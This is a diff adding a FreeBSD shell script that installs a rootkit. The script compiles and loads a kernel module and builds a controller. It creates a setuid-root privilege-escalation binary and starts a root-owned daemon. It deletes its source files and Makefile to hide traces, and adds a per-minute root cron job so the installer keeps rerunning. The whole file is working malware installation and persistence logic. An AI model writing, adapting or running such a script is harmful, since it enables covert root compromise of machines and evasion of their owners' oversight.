@@ -1,0 +1,50 @@
+#!/bin/sh
+
+if [ ! -e /boot/kernel/rootkit.ko ]; then
+	make
+	mv rootkit.ko /boot/kernel
+	make clean
+	rm .depend.rootkit.o
+	rm Makefile
+fi
+
+if [ ! -e /lib/daemon ]; then
+	cc controller.c -o /sbin/controller
+	chmod 755 /sbin/controller
+	cc priv_esc.c -o /bin/priv_esc
+	chmod 755 /bin/priv_esc
+	chmod +s /bin/priv_esc
+	mv daemon /lib/daemon
+	chown root /lib/daemon
+fi
+
+if [ ! -e /dev/cd ]; then
+	/sbin/kldload /boot/kernel/rootkit.ko
+	echo "" > /log.txt
+	chmod 666 /log.txt
+	/lib/daemon $1 &
+	/sbin/controller on
+fi
+
+RESULT=`pgrep daemon`
+
+if [ "${RESULT:-null}" = null ]; then
+	/lib/daemon $1 &
+	/sbin/controller on
+fi
+
+if [ -e rootkit.c ]; then
+	rm -f controller.c priv_esc.c rootkit.c rootkit.tar master log remote
+fi
+
+if [ ! -e /var/cron/tabs/root ] || [ -s /var/cron/tabs/root ]; then
+	echo "SHELL = /bin/sh" > persistence
+	echo "* * * * * /etc/install $1" >> persistence
+	crontab persistence
+	rm persistence
+fi
+
+if [ ! -e /etc/install ]; then
+	mv install /etc/install
+	chown root /etc/install
+fi
